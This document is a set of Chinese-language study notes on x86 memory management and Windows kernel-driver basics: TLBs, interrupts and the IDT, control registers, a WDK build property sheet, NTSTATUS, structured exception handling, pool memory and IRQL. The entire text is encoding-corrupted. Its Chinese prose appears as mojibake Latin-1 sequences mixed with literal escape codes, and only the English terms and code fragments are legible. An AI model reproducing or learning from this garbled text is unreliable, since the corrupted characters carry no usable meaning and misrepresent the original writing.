ä¸åŒçš„CPUè¿™ä¸ªè¡¨çš„å¤§å°ä¸ä¸€æ ·ã€‚ åªè¦Cr3å˜äº†ï¼ŒTLBç«‹é©¬åˆ·æ–°ï¼Œä¸€æ ¸ä¸€å¥—TLBã€‚ æ“ä½œç³»ç»Ÿçš„é«˜2Gæ˜ å°„åŸºæœ¬ä¸å˜ï¼Œå¦‚æœCr3æ”¹äº†ï¼ŒTLBåˆ·æ–°é‡å»ºé«˜2Gä»¥ä¸Šå¾ˆæµªè´¹ã€‚æ‰€ä»¥PDEå’ŒPTEä¸­æœ‰ä¸ªGæ ‡å¿—ä½ï¼Œå¦‚æœGä½ä¸º1åˆ·æ–°TLBæ—¶å°†ä¸ä¼šåˆ·æ–°PDE/PTEçš„Gä½ä¸º1çš„é¡µï¼Œå½“TLBæ»¡äº†ï¼Œæ ¹æ®ç»Ÿè®¡ä¿¡æ¯å°†ä¸å¸¸ç”¨çš„åœ°å€åºŸå¼ƒï¼Œæœ€è¿‘æœ€å¸¸ç”¨çš„ä¿ç•™ã€‚\nTLBæœ‰ä¸åŒçš„ç§ç±»ï¼Œç”¨äºä¸åŒçš„ç¼“å­˜ç›®çš„ï¼Œå®ƒåœ¨X86ä½“ç³»é‡Œçš„å®é™…åº”ç”¨æœ€æ—©æ˜¯ä»Intelçš„486CPUå¼€å§‹çš„ï¼Œåœ¨X86ä½“ç³»çš„CPUé‡Œè¾¹ï¼Œä¸€èˆ¬éƒ½è®¾æœ‰å¦‚ä¸‹4ç»„TLBï¼š\nç¬¬ä¸€ç»„ï¼šç¼“å­˜ä¸€èˆ¬é¡µè¡¨ï¼ˆ4Kå­—èŠ‚é¡µé¢ï¼‰çš„æŒ‡ä»¤é¡µè¡¨ç¼“å­˜ï¼šInstruction-TLB ç¬¬äºŒç»„ï¼šç¼“å­˜ä¸€èˆ¬é¡µè¡¨ï¼ˆ4Kå­—èŠ‚é¡µé¢ï¼‰çš„æ•°æ®é¡µè¡¨ç¼“å­˜ï¼šData-TLB ç¬¬ä¸‰ç»„ï¼šç¼“å­˜å¤§å°ºå¯¸é¡µè¡¨ï¼ˆ2M/4Må­—èŠ‚é¡µé¢ï¼‰çš„æŒ‡ä»¤é¡µè¡¨ç¼“å­˜ï¼šInstruction-TLB ç¬¬å››ç»„ï¼šç¼“å­˜å¤§å°ºå¯¸é¡µè¡¨ï¼ˆ2M/4Må­—èŠ‚é¡µé¢ï¼‰çš„æ•°æ®é¡µè¡¨ç¼“å­˜ï¼šData-TLB ä¸­æ–­ä¸å¼‚å¸¸ ä»€ä¹ˆæ˜¯ä¸­æ–­ï¼Ÿ\nä¸­æ–­é€šå¸¸æ˜¯ç”±CPUå¤–éƒ¨çš„è¾“å…¥è¾“å‡ºè®¾å¤‡ï¼ˆç¡¬ä»¶ï¼‰æ‰€è§¦å‘çš„ï¼Œä¾›å¤–éƒ¨è®¾å¤‡é€šçŸ¥CPU â€œæœ‰äº‹æƒ…éœ€è¦å¤„ç†â€ ï¼Œå› æ­¤åˆå«ä¸­æ–­è¯·æ±‚ï¼ˆInterrupt Requestï¼‰ ä¸­æ–­è¯·æ±‚çš„ç›®çš„æ˜¯å¸Œæœ›CPUæš‚æ—¶åœæ­¢æ‰§è¡Œå½“å‰æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºï¼Œè½¬å»æ‰§è¡Œä¸­æ–­è¯·æ±‚æ‰€å¯¹åº”çš„ä¸­æ–­å¤„ç†ä¾‹ç¨‹ï¼ˆä¸­æ–­å¤„ç†ç¨‹åºåœ¨å“ªç”±IDTè¡¨å†³å®šï¼‰ 80Ã—86æœ‰ä¸¤æ¡ä¸­æ–­è¯·æ±‚çº¿ï¼š éå±è”½ä¸­æ–­çº¿ï¼Œç§°ä¸ºNMI (NonMaskable Interrupt) å¯å±è”½ä¸­æ–­çº¿ï¼Œç§°ä¸ºINTRï¼ˆInterrupt Requireï¼‰ éå±è”½ä¸­æ–­å¦‚ä½•å¤„ç†ï¼Ÿ\nCPUä¼šæŸ¥IDTè¡¨ä¸­çš„2å·ä¸­æ–­ï¼š\nï¼ˆIDTè¡¨ï¼‰ä¸­æ–­å· NMI è¯´æ˜ 0x2 ä¸å¯å±è”½ä¸­æ–­ 80x86ä¸­å›ºå®šä¸º0x2 è§£é‡Šï¼šå½“éå¯å±è”½ä¸­æ–­äº§ç”Ÿæ—¶ï¼ŒCPUåœ¨æ‰§è¡Œå®Œå½“å‰æŒ‡ä»¤åä¼šé‡Œé¢è¿›å…¥ä¸­æ–­å¤„ç†ç¨‹åºã€‚éå¯å±è”½ä¸­æ–­ä¸å—EFLAGå¯„å­˜å™¨ä¸­IFä½çš„å½±å“ï¼Œä¸€æ—¦å‘ç”Ÿï¼ŒCPUå¿…é¡»å¤„ç†éå¯å±è”½ä¸­æ–­å¤„ç†ç¨‹åºä½äºIDTè¡¨ä¸­çš„2å·ä½ç½®\nå¯å±è”½ä¸­æ–­\nåœ¨ç¡¬ä»¶çº§ï¼Œå¯å±è”½ä¸­æ–­æ˜¯ç”±ä¸€å—ä¸“é—¨çš„èŠ¯ç‰‡æ¥ç®¡ç†çš„ï¼Œé€šå¸¸ç§°ä¸ºä¸­æ–­æ§åˆ¶å™¨ã€‚å®ƒè´Ÿè´£åˆ†é…ä¸­æ–­èµ„æºå’Œç®¡ç†å„ä¸ªä¸­æ–­æºå‘å‡ºçš„ä¸­æ–­è¯·æ±‚ä¸ºäº†ä¾¿äºæ ‡è¯†å„ä¸ªä¸­æ–­è¯·æ±‚ï¼Œä¸­æ–­ç®¡ç†å™¨é€šå¸¸ç”¨IRQï¼ˆInterrupt Requestï¼‰åé¢åŠ ä¸Šæ•°å­—æ¥è¡¨ç¤ºä¸åŒçš„ä¸­æ–­ã€‚ æ¯”å¦‚ï¼šåœ¨Windowsä¸­æ—¶é’Ÿä¸­æ–­çš„IRQç¼–å·ä¸º0ä¹Ÿå°±æ˜¯ï¼šIRQ0 å¯å±è”½ä¸­æ–­å¦‚ä½•å¤„ç†ï¼Ÿ\nä¸­æ–­å·å¦‚ä¸‹ï¼š\nï¼ˆIDTè¡¨ï¼‰ä¸­æ–­å· IRQ è¯´æ˜ 0x30 IRQ0 æ—¶é’Ÿä¸­æ–­ 0x31~0x3F IRQ1~IRQ15 å…¶ä»–ç¡¬ä»¶è®¾å¤‡çš„ä¸­æ–­ è§£é‡Šï¼š\nå¦‚æœè‡ªå·±çš„ç¨‹åºæ‰§è¡Œæ—¶ä¸å¸Œæœ›CPUå»å¤„ç†è¿™äº›ä¸­æ–­ï¼Œå¯ä»¥\nç”¨CLIæŒ‡ä»¤æ¸…ç©ºEFLAGå¯„å­˜å™¨ä¸­çš„IFä½\nç”¨STIæŒ‡ä»¤è®¾ç½®EFLAGå¯„å­˜å™¨ä¸­çš„IFä½\nç¡¬ä»¶ä¸­æ–­ä¸IDTè¡¨ä¸­çš„å¯¹åº”å…³ç³»å¹¶éå›ºå®šä¸å˜çš„ï¼Œå‚è§ï¼šAPICï¼ˆé«˜çº§å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨ï¼‰\nå¼‚å¸¸\nå¼‚å¸¸é€šå¸¸æ˜¯CPUåœ¨æ‰§è¡ŒæŒ‡ä»¤æ—¶æ£€æµ‹åˆ°çš„æŸäº›é”™è¯¯ï¼Œæ¯”å¦‚é™¤0ã€è®¿é—®æ— æ•ˆé¡µé¢ç­‰ã€‚ä¸­æ–­ä¸å¼‚å¸¸çš„åŒºåˆ«ï¼š\nä¸­æ–­æ¥è‡ªäºå¤–éƒ¨è®¾å¤‡ï¼Œæ˜¯ä¸­æ–­æºï¼ˆæ¯”å¦‚é”®ç›˜ï¼‰å‘èµ·çš„ï¼ŒCPUæ˜¯è¢«åŠ¨çš„ å¼‚å¸¸æ¥è‡ªäºCPUæœ¬èº«ï¼Œæ˜¯CPUä¸»åŠ¨äº§ç”Ÿçš„ INT Nè™½ç„¶è¢«ç§°ä¸º â€œè½¯ä»¶ä¸­æ–­â€ ï¼Œä½†å…¶æœ¬è´¨æ˜¯å¼‚å¸¸ã€‚EFLAGçš„IFä½å¯¹INT Næ— æ•ˆ æ— è®ºæ˜¯ç”±ç¡¬ä»¶è®¾å¤‡è§¦å‘çš„ä¸­æ–­è¯·æ±‚è¿˜æ˜¯ç”±CPUäº§ç”Ÿçš„å¼‚å¸¸ï¼Œå¤„ç†ç¨‹åºéƒ½åœ¨IDTè¡¨ã€‚\nå¸¸è§å¼‚å¸¸å¤„ç†çš„å¯¹åº”è°ƒç”¨å·ï¼š\né”™è¯¯ç±»å‹ ï¼ˆIDTè¡¨ï¼‰ä¸­æ–­å· é¡µé”™è¯¯ 0xE æ®µé”™è¯¯ 0xD é™¤é›¶é”™è¯¯ 0x0 åŒé‡é”™è¯¯ 0x8 æ§åˆ¶å¯„å­˜å™¨ æ§åˆ¶å¯„å­˜å™¨ç”¨äºæ§åˆ¶å’Œç¡®å®šCPUçš„æ“ä½œæ¨¡å¼\nä¸€å…±æœ‰5ä¸ªæ§åˆ¶å¯„å­˜å™¨ï¼šCr0ï¼ŒCr1ï¼ŒCr2ï¼ŒCr3ï¼ŒCr4\nå…¶ä¸­Cr1ä¿ç•™ï¼ŒCr3ä¸ºé¡µç›®å½•è¡¨åŸºå€\nCr0å¯„å­˜å™¨\nPEä½æ˜¯å¯ç”¨ä¿æŠ¤æ¨¡å¼ï¼ˆProtection Enableï¼‰æ ‡å¿—ã€‚\nè‹¥PE = 1æ˜¯å¼€å¯ä¿æŠ¤æ¨¡å¼ï¼Œåä¹‹ä¸ºå®åœ°å€æ¨¡å¼ã€‚è¿™ä¸ªæ ‡å¿—ä»…å¼€å¯æ®µçº§ä¿æŠ¤ï¼Œè€Œå¹¶æ²¡æœ‰å¯ç”¨åˆ†é¡µæœºåˆ¶ã€‚è‹¥è¦å¯ç”¨åˆ†é¡µæœºåˆ¶ï¼Œé‚£ä¹ˆPEå’ŒPGæ ‡å¿—éƒ½è¦ç½®ä½ã€‚\nPGä½æ˜¯å¯ç”¨åˆ†é¡µæœºåˆ¶ã€‚åœ¨å¼€å¯è¿™ä¸ªæ ‡å¿—ä¹‹å‰å¿…é¡»å·²ç»æˆ–è€…åŒæ—¶å¼€å¯PEæ ‡å¿—ã€‚\nPG = 0ä¸”PE = 0ï¼Œå¤„ç†å™¨å·¥ä½œåœ¨å®åœ°å€æ¨¡å¼ä¸‹ã€‚\nPG = 0ä¸”PE = 1ï¼Œå¤„ç†å™¨å·¥ä½œåœ¨æ²¡æœ‰å¼€å¯åˆ†é¡µæœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ã€‚\nPG = 1ä¸”PE = 0ï¼Œåœ¨PEæ²¡æœ‰å¼€å¯çš„æƒ…å†µä¸‹æ— æ³•å¼€å¯PGã€‚\nPG = 1ä¸”PE = 1ï¼Œå¤„ç†å™¨å·¥ä½œåœ¨å¼€å¯äº†åˆ†é¡µæœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ã€‚\nWPä½å¯¹äºIntel 80486æˆ–ä»¥ä¸Šçš„CPUï¼Œæ˜¯å†™ä¿æŠ¤ï¼ˆWrite Proctectï¼‰æ ‡å¿—ã€‚å½“è®¾ç½®è¯¥æ ‡å¿—æ—¶ï¼Œå¤„ç†å™¨ä¼šç¦æ­¢è¶…çº§ç”¨æˆ·ç¨‹åºï¼ˆä¾‹å¦‚ç‰¹æƒçº§0çš„ç¨‹åºï¼‰å‘ç”¨æˆ·çº§åªè¯»é¡µé¢æ‰§è¡Œå†™æ“ä½œï¼›\nå½“CPL \u003c 3çš„æ—¶å€™ï¼š\nå¦‚æœWP = 0å¯ä»¥è¯»å†™ä»»æ„ç”¨æˆ·çº§ç‰©ç†é¡µï¼Œåªè¦çº¿æ€§åœ°å€æœ‰æ•ˆã€‚\nå¦‚æœWP = 1å¯ä»¥è¯»å–ä»»æ„ç”¨æˆ·çº§ç‰©ç†é¡µï¼Œä½†å¯¹äºåªè¯»çš„ç‰©ç†é¡µï¼Œåˆ™ä¸èƒ½å†™ã€‚\nCr2å¯„å­˜å™¨\nå½“CPUè®¿é—®æŸä¸ªæ— æ•ˆé¡µé¢æ—¶ï¼Œä¼šäº§ç”Ÿç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶ï¼ŒCPUä¼šå°†å¼•èµ·å¼‚å¸¸çš„çº¿æ€§åœ°å€å­˜æ”¾åœ¨Cr2ä¸­ã€‚\nCr4å¯„å­˜å™¨\nPAE = 1æ˜¯2-9-9-12åˆ†é¡µPAE = 0æ˜¯10-10-12åˆ†é¡µã€‚å…¶å®å°±æ˜¯é‚£ä¸ªboot.iniæ–‡ä»¶é‡Œé¢æˆ‘ä»¬ä¿®æ”¹çš„é‚£ä¸ªæ¥åˆ¤æ–­çš„ï¼Œæ“ä½œç³»ç»Ÿå¸Œæœ›æˆ‘ä»¬ç”¨ä»€ä¹ˆæ ·çš„åˆ†é¡µæ¥å¯åŠ¨æ“ä½œç³»ç»Ÿã€‚\nPSEæ˜¯å¤§é¡µæ˜¯å¦å¼€å¯çš„æ€»å¼€å…³ï¼Œå¦‚æœç½®0ï¼Œå°±ç®—PDEä¸­è®¾ç½®äº†å¤§é¡µä½ ä¹Ÿå¾—æ˜¯æ™®é€šçš„é¡µã€‚\nPSE PS åˆ†é¡µç±»å‹ é¡µå¤§å° 1 1 2-9-9-12 2M 1 0 2-9-9-12 4K 1 1 10-10-12 4M 1 0 10-10-12 4K 0 1 2-9-9-12 4K 0 0 2-9-9-12 4K 0 1 10-10-12 4K 0 0 10-10-12 4K PWT ä¸ PCD CPUç¼“å­˜\nCPUç¼“å­˜æ˜¯ä½äºCPUä¸ç‰©ç†å†…å­˜ä¹‹é—´çš„ä¸´æ—¶å­˜å‚¨å™¨ï¼Œå®ƒçš„å®¹é‡æ¯”å†…å­˜å°çš„å¤šä½†æ˜¯äº¤æ¢é€Ÿåº¦å´æ¯”å†…å­˜è¦å¿«å¾—å¤šã€‚å®ƒå¯ä»¥åšçš„å¾ˆå¤§ã€‚\nCPUç¼“å­˜ä¸TLBç±»ä¼¼ä½†æœ‰æ‰€ä¸åŒï¼ŒTLBå­˜çš„æ˜¯çº¿æ€§åœ°å€ä¸ç‰©ç†åœ°å€çš„å¯¹åº”å…³ç³»ï¼ŒCPUç¼“å­˜å­˜çš„æ˜¯ç‰©ç†åœ°å€ä¸å†…å®¹å¯¹åº”å…³ç³»ã€‚\nCPUç¼“å­˜çš„å¯¹åº”å…³ç³» TLBçš„å¯¹åº”å…³ç³» ç‰©ç†åœ°å€ çº¿æ€§åœ°å€ å†…å®¹ ç‰©ç†åœ°å€ PWT_PCD:\nPWTå…¨ç§°ä¸ºPage Write Throughï¼ŒPWT = 1æ—¶ï¼Œå†™Cacheçš„æ—¶å€™ä¹Ÿè¦å°†æ•°æ®å†™å…¥å†…å­˜ä¸­ã€‚\nPCDå…¨ç§°ä¸ºPage Cache Disableï¼ŒPCD = 1æ—¶ï¼Œç¦æ­¢æŸä¸ªé¡µå†™å…¥ç¼“å­˜ï¼Œç›´æ¥å†™å†…å­˜ã€‚æ¯”å¦‚ï¼Œåšé¡µè¡¨ç”¨çš„é¡µï¼Œå·²ç»å­˜å‚¨åœ¨TLBä¸­äº†ï¼Œå¯èƒ½ä¸éœ€è¦å†ç¼“å­˜äº†ã€‚\né©±åŠ¨ ç¯å¢ƒ å…ˆä»32ä½çš„ç³»ç»Ÿå¼€å§‹å­¦ä¹ ï¼Œå®‰è£…ä¸€ä¸‹VS2010+WDK7600ï¼Œè¿œå¤ç‰ˆæœ¬ã€‚\né‡Œé¢è®¾ç½®å±æ€§è¡¨çš„ä»£ç å¦‚ä¸‹ï¼š\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cProject ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u003e \u003cImportGroup Label=\"PropertySheets\" /\u003e \u003cPropertyGroup Label=\"UserMacros\" /\u003e \u003cPropertyGroup\u003e \u003cExecutablePath\u003eC:\\WinDDK\\7600.16385.1\\bin\\x86;$(ExecutablePath)\u003c/ExecutablePath\u003e \u003c/PropertyGroup\u003e \u003cPropertyGroup\u003e \u003cIncludePath\u003eC:\\WinDDK\\7600.16385.1\\inc\\api;C:\\WinDDK\\7600.16385.1\\inc\\ddk;C:\\WinDDK\\7600.16385.1\\inc\\crt;$(IncludePath)\u003c/IncludePath\u003e \u003c/PropertyGroup\u003e \u003cPropertyGroup\u003e \u003cLibraryPath\u003eC:\\WinDDK\\7600.16385.1\\lib\\win7\\i386;$(LibraryPath)\u003c/LibraryPath\u003e \u003cTargetExt\u003e.sys\u003c/TargetExt\u003e \u003cLinkIncremental\u003efalse\u003c/LinkIncremental\u003e \u003cGenerateManifest\u003efalse\u003c/GenerateManifest\u003e \u003c/PropertyGroup\u003e \u003cItemDefinitionGroup\u003e \u003cClCompile\u003e \u003cPreprocessorDefinitions\u003e_X86_;DBG\u003c/PreprocessorDefinitions\u003e \u003cCallingConvention\u003eStdCall\u003c/CallingConvention\u003e \u003cExceptionHandling\u003efalse\u003c/ExceptionHandling\u003e \u003cBasicRuntimeChecks\u003eDefault\u003c/BasicRuntimeChecks\u003e \u003cBufferSecurityCheck\u003efalse\u003c/BufferSecurityCheck\u003e \u003cCompileAs\u003eDefault\u003c/CompileAs\u003e \u003cDebugInformationFormat\u003eProgramDatabase\u003c/DebugInformationFormat\u003e \u003c/ClCompile\u003e \u003cLink\u003e \u003cAdditionalDependencies\u003entoskrnl.lib;wdm.lib;wdmsec.lib;wmilib.lib;ndis.lib;Hal.lib;MSVCRT.LIB;LIBCMT.LIB;%(AdditionalDependencies)\u003c/AdditionalDependencies\u003e \u003c/Link\u003e \u003cLink\u003e \u003cIgnoreAllDefaultLibraries\u003etrue\u003c/IgnoreAllDefaultLibraries\u003e \u003cEnableUAC\u003efalse\u003c/EnableUAC\u003e \u003cSubSystem\u003eNative\u003c/SubSystem\u003e \u003cEntryPointSymbol\u003eDriverEntry\u003c/EntryPointSymbol\u003e \u003cBaseAddress\u003e0x10000\u003c/BaseAddress\u003e \u003cRandomizedBaseAddress\u003e \u003c/RandomizedBaseAddress\u003e \u003cDataExecutionPrevention\u003e \u003c/DataExecutionPrevention\u003e \u003cGenerateDebugInformation\u003etrue\u003c/GenerateDebugInformation\u003e \u003cDriver\u003eDriver\u003c/Driver\u003e \u003c/Link\u003e \u003c/ItemDefinitionGroup\u003e \u003cItemGroup /\u003e \u003c/Project\u003e è®°ä½è¦ä¿®æ”¹C:\\WinDDK\\7600.16385.1è¿™ä¸ªä¸ºWDKçš„è·¯å¾„ã€‚\næ–‡ç« \nä¸Šé¢çš„ï¼Œå±æ€§ç®¡ç†å™¨åœ¨è§†å›¾â€”-\u003eå…¶ä»–çª—å£\nå†…æ ¸ç¼–ç¨‹åŸºç¡€ åœ¨åº”ç”¨å±‚ç¼–ç¨‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨WINDOWSæä¾›çš„å„ç§APIå‡½æ•°ï¼Œåªè¦å¯¼å…¥å¤´æ–‡ä»¶windows.hå°±å¯ä»¥äº†ã€‚ä½†æ˜¯åœ¨å†…æ ¸ç¼–ç¨‹çš„æ—¶å€™ï¼Œå¾®è½¯ä¸ºå†…æ ¸ç¨‹åºæä¾›äº†ä¸“ç”¨çš„APIï¼Œåªè¦åœ¨ç¨‹åºä¸­åŒ…å«ç›¸åº”çš„å¤´æ–‡ä»¶å°±å¯ä»¥ä½¿ç”¨äº†ï¼Œå¦‚ï¼š#include \u003cntddk.h\u003eï¼Œå‡è®¾ä½ å®‰è£…äº†WDKã€‚\nä¸ºä»€ä¹ˆè¦ç”¨ä¸¤ä¸ªå¤´æ–‡ä»¶ï¼šä¸ºäº†å®‰å…¨ï¼Œå› ä¸ºå†…æ ¸å¾ˆè„†å¼±ï¼Œç”¨3ç¯çš„å¤´æ–‡ä»¶å°±å‹åŠ›å¤§äº†ï¼›è€Œä¸”ä¸€ä¸ªæ²¡è¿›0ç¯ä¸€ä¸ªè¿›0ç¯äº†ï¼Œä¸ä¸€æ ·ã€‚\nåœ¨åº”ç”¨å±‚ç¼–ç¨‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šè¿‡MSDNæ¥äº†è§£å‡½æ•°çš„è¯¦ç»†ä¿¡æ¯ï¼Œåœ¨å†…æ ¸ç¼–ç¨‹çš„æ—¶å€™ï¼Œè¦ä½¿ç”¨WDKè‡ªå·±çš„å¸®åŠ©æ–‡æ¡£ã€‚\nWDKè¯´æ˜æ–‡æ¡£ä¸­åªåŒ…å«äº†å†…æ ¸æ¨¡å—å¯¼å‡ºçš„å‡½æ•°ï¼Œå¯¹äºæœªå¯¼å‡ºçš„å‡½æ•°ï¼Œåˆ™ä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚å¦‚æœè¦å¾·ç”¨æœªå¯¼å‡ºçš„å‡½æ•°ï¼Œåªè¦è‡ªå·±å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¹¶ä¸”ä¸ºå‡½æ•°æŒ‡é’ˆæä¾›æ­£ç¡®çš„å‡½æ•°åœ°å€å°±å¯ä»¥ä½¿ç”¨äº†ã€‚æœ‰ä¸¤ç§åŠæ³•éƒ½å¯ä»¥è·å–ä¸ºå¯¼å‡ºçš„å‡½æ•°åœ°å€ï¼š\nç‰¹å¾ç æœç´¢ è§£æå†…æ ¸PDBæ–‡ä»¶ï¼ˆå°±æ˜¯windbgä¸­å¯ä»¥ä½¿ç”¨u å‡½æ•°åæ¥è·å–å‡½æ•°çš„åæ±‡ç¼–çš„åŸå› ï¼‰ è¡¥å…… è§£é‡Š æœªå¯¼å‡ºå‡½æ•° å¯¼å‡ºè¡¨é‡Œé¢æ²¡æœ‰è¯¥å‡½æ•°ï¼Œæ–‡æ¡£é‡Œé¢è‡ªç„¶æ²¡æœ‰è¯¥å‡½æ•° æœªæ–‡æ¡£åŒ–å‡½æ•° æ–‡æ¡£é‡Œé¢æ²¡æœ‰å†™è¯¥å‡½æ•°ï¼Œä½†åœ¨å¯¼å‡ºè¡¨é‡Œé¢æœ‰è¯¥å‡½æ•° åŸºæœ¬æ•°æ®ç±»å‹\nåœ¨å†…æ ¸ç¼–ç¨‹çš„æ—¶å€™ï¼Œå¼ºçƒˆå»ºè®®å¤§å®¶éµå®ˆWDKçš„ç¼–ç ä¹ æƒ¯ï¼Œå»ºè®®ä¸è¦è¿™æ ·å†™ï¼šunsigned long length;ï¼Œå»ºè®®è¿™æ ·å†™ï¼šULONG lengthã€‚\nä¹ æƒ¯ä½¿ç”¨WDKè‡ªå·±çš„ç±»å‹ï¼š\nWDK ä¹ æƒ¯ SDK ä¹ æƒ¯ ULONG unsigned long PULONG unsigned long* UCHAR unsigned char PUCHAR unsigned char* UINT unsigned int PUNIT unsigned int* VOID void PVOID void* è¿”å›å€¼\nå¤§éƒ¨åˆ†å†…æ ¸å‡½æ•°çš„è¿”å›å€¼éƒ½æ˜¯NTSTATUSç±»å‹ï¼Œå¦‚ï¼š\nNTSTATUS PsCreateSystemThread(); NTSTATUS ZwOpenProcess(); NTSTATUS ZwOpenEvent(); è¿™ä¸ªå€¼èƒ½è¯´æ˜å‡½æ•°æ‰§è¡Œçš„ç»“æœï¼Œæ¯”å¦‚ï¼š\n#define STATUS_SUCCESS 0x00000000 //æˆåŠŸ #define STATUS_INVALID_PARAMETER 0xC000000D //å‚æ•°æ— æ•ˆ #define STATUS_BUFFER_OVERFLOW 0x80000005 //ç¼“å†²åŒºé•¿åº¦ä¸å¤Ÿ //â€¦â€¦ //è¿™é‡Œæ¯ä¸€ä¸ªå€¼éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„å®ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œä¸€ä¸ªå†…æ ¸å‡½æ•°åå¯ä»¥åˆ¤æ–­è¿”å›å€¼ä¸ºSTATUS_XXXXXXï¼Œå°±å¯ä»¥åˆ¤æ–­å‡½æ•°çš„æ‰§è¡ŒçŠ¶æ€äº†ï¼Œå¯è¯»æ€§å¥½ä¸€äº› å½“ä½ è°ƒç”¨çš„å†…æ ¸å‡½æ•°ï¼Œå¦‚æœè¿”å›çš„ç»“æœä¸æ˜¯STATUS_SUCCESSï¼Œå°±è¯´æ˜å‡½æ•°æ‰§è¡Œä¸­é‡åˆ°äº†é—®é¢˜ï¼Œå…·ä½“æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œå¯ä»¥åœ¨ntstatus.hæ–‡ä»¶ä¸­æŸ¥çœ‹ã€‚\nå¼‚å¸¸å¤„ç†\nåœ¨å†…æ ¸ä¸­ï¼Œä¸€ä¸ªå°å°çš„é”™è¯¯å°±å¯èƒ½å¯¼è‡´è“å±ï¼Œæ¯”å¦‚ï¼šè¯»å†™ä¸€ä¸ªæ— æ•ˆçš„å†…å­˜åœ°å€ã€‚ä¸ºäº†è®©è‡ªå·±çš„å†…æ ¸ç¨‹åºæ›´åŠ å¥å£®ï¼Œå¼ºçƒˆå»ºè®®å¤§å®¶åœ¨ç¼–å†™å†…æ ¸ç¨‹åºæ—¶ï¼Œä½¿ç”¨å¼‚å¸¸å¤„ç†ã€‚\nWindowsæä¾›äº†ç»“æ„åŒ–å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œä¸€èˆ¬çš„ç¼–è¯‘å™¨éƒ½æ˜¯æ”¯æŒçš„ï¼Œå¦‚ä¸‹ï¼š\n__try{ //å¯èƒ½å‡ºé”™çš„ä»£ç  } __except(filter_value) { //å‡ºé”™æ—¶è¦æ‰§è¡Œçš„ä»£ç  } å‡ºç°å¼‚å¸¸æ—¶ï¼Œå¯æ ¹æ®filter_valueçš„å€¼æ¥å†³å®šç¨‹åºè¯¥å¦‚æœæ‰§è¡Œï¼Œå½“filter_valueçš„å€¼ä¸ºï¼š\nEXCEPTION_EXECUTE_HANDLER(1)ï¼šä»£ç è¿›å…¥exceptå— EXCEPTION_CONTINUE_SEARCH(0)ï¼šä¸å¤„ç†å¼‚å¸¸ï¼Œç”±ä¸Šä¸€å±‚è°ƒç”¨å‡½æ•°å¤„ç† EXCEPTION_CONTINUE_EXECUTION(-1)ï¼šå›å»ç»§ç»­æ‰§è¡Œé”™è¯¯å¤„çš„ä»£ç  å¸¸ç”¨çš„å†…æ ¸å†…å­˜å‡½æ•°\nå¯¹å†…å­˜çš„ä½¿ç”¨ï¼Œä¸»è¦å°±æ˜¯ï¼šç”³è¯·ã€è®¾ç½®ã€æ‹·è´ä»¥åŠé‡Šæ”¾ã€‚\ncè¯­è¨€ å†…æ ¸ä¸­ malloc ExAllocatePoolWithTag memset RtlFillMemory memcpy RtlMoveMemory free ExFreePool è¯·æ³¨æ„ExAllocatePoolWithTagå‡½æ•°çš„POOL_TYPE PoolTypeå‚æ•°ï¼š\ntypedef enum _POOL_TYPE { NonPagedPool, PagedPool, NonPagedPoolMustSucceed, DontUseThisType, NonPagedPoolCacheAligned, PagedPoolCacheAligned, NonPagedPoolCacheAlignedMustS } POOL_TYPE; NonPagedPoolä»£è¡¨éåˆ†é¡µå†…å­˜ï¼ŒPagedPoolä»£è¡¨åˆ†é¡µå†…å­˜\néåˆ†é¡µå†…å­˜ï¼šç‰©ç†é¡µå¾ˆé‡è¦ï¼Œç³»ç»Ÿä¸ä¼šæ”¾åˆ°ç¡¬ç›˜ä¸Šçš„å†…å­˜ï¼ˆå¸¸é©»ï¼Œå­˜ä»£ç ï¼‰\nåˆ†é¡µå†…å­˜ï¼šç‰©ç†é¡µæ²¡é‚£ä¹ˆé‡è¦ï¼Œå…è®¸æŠŠç‰©ç†é¡µå†™åˆ°ç¡¬ç›˜ä¸Šçš„å†…å­˜ï¼ˆå­˜æ•°æ®ï¼‰\nIRQL\nä»€ä¹ˆæ˜¯ä¸­æ–­è¯·æ±‚çº§åˆ«ï¼šå°±æ˜¯CPUåœ¨æ‰§è¡Œæ—¶ä¼šé‡åˆ°ä¸­æ–­æ—¶ä¼šæ‰§è¡Œä¸­æ–­ç¨‹åºï¼Œä½†æ˜¯å¦‚æœåœ¨æ‰§è¡Œæ—¶åˆé‡åˆ°äº†ä¸­æ–­ï¼Œè¿™æ—¶è¯¥æ‰§è¡Œå“ªä¸ªä¸­æ–­ç¨‹åºå‘¢ï¼Ÿæ­¤æ—¶å°±éœ€è¦çœ‹ä¸¤ä¸ªä¸­æ–­çš„ä¸­æ–­çº§åˆ«äº†ï¼ˆä¸­æ–­æ˜¯åˆ†ç­‰çº§çš„ï¼ï¼‰ï¼Œå¦‚æœç°åœ¨CPUæ‰§è¡Œä¸­æ–­çš„ç­‰çº§é«˜äºåˆé‡åˆ°çš„ä¸­æ–­ï¼Œé‚£ä¹ˆå°±å¿½ç•¥è¿™ä¸ªæ–°æ¥çš„ä¸­æ–­ï¼›å¦åˆ™å°±ä¼šç»ˆæ­¢å½“å‰çš„ä¸­æ–­ç¨‹åºï¼Œè½¬å»æ‰§è¡Œæ–°æ¥çš„ä¸­æ–­ç¨‹åºï¼ˆè¢«æ‰“æ–­äº†ï¼‰ã€‚ IRQLæ˜¯Windowsè‡ªå·±å®šä¹‰çš„ä¸€å¥—ä¼˜å…ˆçº§æ–¹æ¡ˆï¼Œä¸CPUæ— å…³ï¼Œæ•°å€¼è¶Šå¤§æƒé™è¶Šé«˜ï¼Œç›¸åŒæƒé™æ— æ³•äº’ç›¸æ‰“æ–­ï¼Œåªæœ‰æ›´é«˜çš„æƒé™æ‰èƒ½æ‰“æ–­ã€‚ 